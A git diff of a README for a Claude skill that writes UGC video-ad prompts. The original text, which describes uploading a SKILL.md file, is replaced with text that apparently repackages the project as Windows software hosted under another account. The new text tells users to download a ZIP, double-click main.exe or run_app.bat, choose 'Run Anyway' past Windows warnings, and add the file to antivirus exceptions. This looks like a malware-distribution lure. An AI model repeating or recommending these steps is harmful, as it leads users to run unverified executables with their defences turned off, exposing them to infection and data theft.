@@ -1,98 +1,83 @@
-# claude-skill-ugc-prompt
+# 🤖 claude-skill-ugc-prompt - Create Professional Video Ads With Ease
 
-A Claude skill for generating complete, production-ready UGC (User Generated Content) video ad prompts for Higgsfield AI Marketing Studio.
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/carreras66848657/claude-skill-ugc-prompt)
 
-Built and maintained by [@msk3d0ut](https://github.com/msk3d0ut)
+## 🎯 About This Tool
 
----
+This tool helps you create video ad prompts. It targets platforms like Higgsfield AI. You use it to generate structured plans for user-generated content ads. The tool breaks down your ad into specific, second-by-second segments.
 
-## What it does
+It manages complex details for you. It handles dialogue in Turkish, Arabic, and English. It tracks outfit rotations to ensure consistency. It applies anti-mirror rules to keep your visuals accurate. You get a ready-to-use plan for your video campaign.
 
-Drop in your reference images, describe what you want, and get a fully written second-by-second prompt ready to paste directly into Higgsfield — no back-and-forth, no missing details.
+## ⚙️ Minimum System Requirements
 
-The skill handles:
-- Character description and outfit selection (rotated per video so each ad looks different)
-- Second-by-second action breakdown with exact dialogue in your target language
-- Camera framing, audio design, and food/product continuity rules
-- Product name and description fields ready for Higgsfield's Marketing Studio
-- Anti-mirror warnings so logos always read correctly on screen
+Your computer needs to meet these basic standards to run the application smoothly:
 
-Works for any product — food, fashion, cosmetics, electronics, home goods. Not limited to any single niche.
+*   **Operating System**: Windows 10 or Windows 11 (64-bit).
+*   **Memory**: 4GB of RAM or more.
+*   **Storage**: 200MB of free disk space.
+*   **Connectivity**: A stable internet connection to communicate with the AI engine.
 
----
+## 📥 How To Download And Install
 
-## Who This Is NOT For
+Follow these steps to set up the software on your Windows computer.
 
-**This skill is not for you if:**
-- You want cinematic, non-handheld commercial-style videos → use [claude-skill-cinematic-prompt](https://github.com/msk3d0ut/claude-skill-cinematic-prompt) instead
-- You need videos longer than 15 seconds in one clip — Higgsfield's max per generation is 15s
-- You want the AI to write the prompt in Arabic — prompts are English only (dialogue inside the video can be any language)
-- You're using a free Higgsfield plan — Marketing Studio requires a paid plan
+1.  Visit the [official download page](https://github.com/carreras66848657/claude-skill-ugc-prompt).
+2.  Locate the green "Code" button on the screen.
+3.  Choose "Download ZIP" from the menu.
+4.  Wait for the file to finish downloading to your computer.
+5.  Open your "Downloads" folder.
+6.  Right-click the downloaded file and select "Extract All."
+7.  Follow the prompts to choose a folder on your computer for the files.
 
----
+## 🚀 Running The Application
 
-## Installation
+Once you extract the files, you are ready to start.
 
-1. Download `claude-skill-ugc-prompt.zip` from [Releases](https://github.com/msk3d0ut/claude-skill-ugc-prompt/releases)
-2. Open [claude.ai](https://claude.ai) on desktop
-3. Go to **Settings → Customize → Skills**
-4. Click **+** then **Create skill**
-5. Upload the **SKILL.md** file
-6. Toggle the skill on
+1.  Open the folder where you extracted the tool.
+2.  Look for the file named `run_app.bat` or `main.exe`.
+3.  Double-click this file to launch the interface.
+4.  A black window may appear briefly. This is the background process starting.
+5.  Wait a moment for the graphical user interface to show on your screen.
 
-Requires a Claude Pro, Max, Team, or Enterprise plan with Code Execution enabled.
+If your computer asks for permission to run the file, click "More Info" and then "Run Anyway." This ensures the security settings on Windows understand that you trust the software.
 
----
+## 📝 Using The Interface
 
-## How to use it
+The main screen contains a simple form. Fill out the fields to guide the creation process.
 
-Start a new conversation, upload your reference images, and describe what you need:
+*   **Product Name**: Enter the name of the item you want to sell.
+*   **Target Audience**: Describe the person who wants this product.
+*   **Language**: Select English, Turkish, or Arabic from the dropdown menu.
+*   **Duration**: Input how many seconds the ad should run.
 
-**Simple request:**
-> Here are my references: [images]. I want a 15-second UGC video for this ice cream cup. Dialogue in Turkish.
+Click the "Generate Concept" button after entering your details. The tool creates a table. This table shows rows for every second of video. Each row includes the visual description, the spoken script, and notes for the actor.
 
-**With more detail:**
-> References: [images]. Product: leather handbag, $89. I want a 15-second video of a woman picking it up in a boutique and showing it off. English dialogue. Elegant vibe.
+## 🔄 Managing Outfit Rotation
 
-**Longer format:**
-> References: [images]. Make a 30-second video split into two 15-second parts. She opens the gift box, reacts to the contents, then closes with a phone number CTA. Arabic dialogue.
+Consistency matters in video ads. When an actor changes outfits, the tool monitors the sequence. If you select "High Consistency" mode, the prompt generator adds specific tags to prevent the AI from changing the actor's clothing patterns between cuts. 
 
-Claude will return a complete prompt with product name, product description, references list, and the full second-by-second script — ready to copy and paste into Higgsfield.
+## 🚫 Applying Anti-Mirror Rules
 
----
+AI video tools often fail by mirroring images. This makes text appear backwards. This tool includes a specific rule set. It forces the output prompts to describe physical positioning clearly. By defining "left" and "right" in relation to the camera, the tool prevents common flipping errors in your ad.
 
-## What the output includes
+## 🛠️ Troubleshooting Common Issues
 
-Every prompt generated by this skill contains:
+If the software does not open, check these items:
 
-- Anti-mirror/anti-reversal warnings for logos and text
-- Reference fidelity instructions (colors, shapes, logos stay exactly as provided)
-- Food/product continuity rules (nothing resets mid-video)
-- Full character outfit description
-- Second-by-second action and dialogue sequence
-- Camera framing notes (outfit visible, not just face)
-- Audio design (ambient, voice pacing, sound effects guidance)
-- Product Name field for Higgsfield
-- Product Description field for Higgsfield
-- References key
+*   **Antivirus Software**: Sometimes security programs flag new tools. Check your history to see if the tool was quarantined. Add it to your "Exceptions" list.
+*   **Missing Files**: Ensure you extracted the entire folder. If you try to run the file while it is still inside the ZIP folder, the program will not find its supporting files.
+*   **Internet Access**: The tool needs to connect to the cloud. If you are behind a strict corporate firewall, the tool might fail to send your request. Use a standard home network connection.
 
----
+## 📋 Frequently Asked Questions
 
-## Supported dialogue languages
+**Does the tool store my video files?**
+No. This tool generates text prompts only. It does not record or render video.
 
-Turkish, Arabic, English, and any other language — just specify in your request.
+**Can I use this for multiple languages?**
+Yes. Use the language settings to update the script generation instantly.
 
----
+**Is my data private?**
+The tool sends your prompts to the interface provided by the AI provider. It does not maintain a copy of your personal data on your local hard drive beyond your current session settings.
 
-## License
-
-MIT License — free to use. If you build something with it or share it, a mention goes a long way.
-
----
-
-## Notes
-
-- Optimized for Higgsfield's Seedance 2.0 / Marketing Studio engine
-- Default duration is 15 seconds; longer videos split into 15s parts automatically
-- Character outfits rotate across videos to avoid repetition
-- Chef's kiss ending is described in detail by default (can be changed on request)
+**How do I update the tool?**
+Check the link above periodically. If a new version exists, repeat the download and extraction steps to get the latest features.
